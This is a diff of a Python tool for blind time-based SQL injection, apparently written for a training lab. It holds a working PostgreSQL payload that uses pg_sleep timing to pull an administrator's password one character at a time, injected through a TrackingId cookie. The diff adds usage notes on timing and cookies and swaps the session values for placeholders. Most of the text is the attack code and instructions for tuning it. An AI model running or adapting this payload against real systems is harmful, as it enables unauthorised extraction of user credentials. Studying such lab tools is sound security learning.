@@ -7,7 +7,25 @@ def bad_sql_query(indice: str=None, parameter: str=None):
     bad_sql = f"' || (SELECT CASE WHEN (SELECT SUBSTRING(password,{indice},1) FROM users WHERE username = 'administrator'){parameter} THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
     return bad_sql
 
-"""Here the function you need if you want to use cookies !!!!!"""
+"""
+    The function here is used to perform blind time based SQLi. 
+    
+    ### CONCERNING THE COOKIES OPTION : ####"
+    
+    First of all, the default function will use cookies to make SQLi. 
+    You can simply delete the "cookies" dictionnary or quotes theme to make a simple commentary. If you make that, please make sure to change the
+    "r" variable. It contain the "cookies" options and if you don't delete it, problem can be create.
+    
+    ### CONCERNING THE RESULT_BOOL VARIABLE ###
+    
+    This attack used widely the time to perform his technic. Make sure to have a good connection and to modify the "5" seconds remaining if
+    this is not enought. I recommend to not lower the value below 5, in case, false-positiv can be detected. 
+    
+    ### CONCERNING THE bad_sqli_query FUNCTION ###
+
+    Make sure to change the bad_sql variable in the bad_sqli_query function. But be sure to include an SQL query that corresponds to the technique you're using !
+
+"""
 
 
 def sending_payload_for_time_based_SQLi(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int):
@@ -18,8 +36,8 @@ def sending_payload_for_time_based_SQLi(payload_parameter1 : str, payload_parame
     
     #SET THE COOKIES HERE WITH NAME AND VALUE IF NOT... JUST MAKE IT EMPTY !!!
     cookies = {
-        'TrackingId': f"XjQ2JwV5JfB2cKtB{bad_sql1}",
-        'session': 'f3J77lM9osm20WxoZHpww4HvYl2uQTfm'
+        'TrackingId': f"XXX{bad_sql1}",
+        'session': 'xxx'
     }
     
     """Where the magic happens, we start the clock to know how much time the server answer to us"""
@@ -41,8 +59,8 @@ def sending_payload_for_time_based_SQLi(payload_parameter1 : str, payload_parame
         
     bad_sql2 = bad_sql_query(indice, payload_parameter2)
     cookies = {
-            'TrackingId': f"a7s2nqSm2F5JvzWr	{bad_sql2}",
-            'session': 'FQo0PLt1aAaifSB1Su54nQhlr4C624ga'
+            'TrackingId': f"xxx	{bad_sql2}",
+            'session': 'XXX'
         }
     
     start_time = time.time()
